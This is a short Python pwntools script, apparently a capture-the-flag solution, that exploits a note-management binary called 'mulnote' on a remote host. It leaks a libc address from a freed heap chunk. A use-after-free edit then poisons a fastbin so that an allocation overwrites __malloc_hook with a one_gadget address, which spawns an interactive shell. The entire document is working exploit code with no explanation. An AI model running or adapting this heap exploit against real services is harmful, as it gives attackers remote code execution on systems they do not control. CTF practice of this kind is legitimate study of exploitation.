from pwn import *
context.log_level = "debug"
bin = ELF("mulnote")
libc = ELF("libc.so")
#p = bin.process(env={"LD_PRELOAD":libc.path})
p = remote("112.126.101.96",9999)
def Debug():    
    gdb.attach(p)
def Create(size,content):
    p.sendlineafter("[Q]uit\n>","C")
    p.sendlineafter("size>",str(size))
    p.sendlineafter("note>",content)    
    p.recvuntil("DONE\n")
def Edit(idx,content):    
    p.sendlineafter("[Q]uit\n>","E")    
    p.sendlineafter("index>",str(idx))    
    p.sendafter("new note>",content)
def Remove(idx):    
    p.sendlineafter("[Q]uit\n>","R")    
    p.sendlineafter("index>",str(idx))
def Show():    
    p.sendlineafter("[Q]uit\n>","S")
Create(0xf8,"zoniony")#0
Remove(0)
Create(0xf8,"zoniony")#0
Show()
p.recvuntil("zoniony\n")
libc.address = u64(p.recv(6)+'\x00'*2)-0x3c4b78
success("libc.address-->"+hex(libc.address))
Create(0x68,"zoniony")#1
Create(0x68,"zoniony")#2
Create(0x68,"zoniony")#3
Create(0x68,"zoniony")#4
Create(0x68,"zoniony")#5
Remove(2)
Remove(3)
Edit(3,p64(libc.sym["__malloc_hook"]-0x23))
Create(0x68,"zoniony")#2
Create(0x68,"A"*3+p64(0)*2+p64(libc.address+0x4526a))#3
p.sendlineafter("[Q]uit\n>","C")
p.interactive()
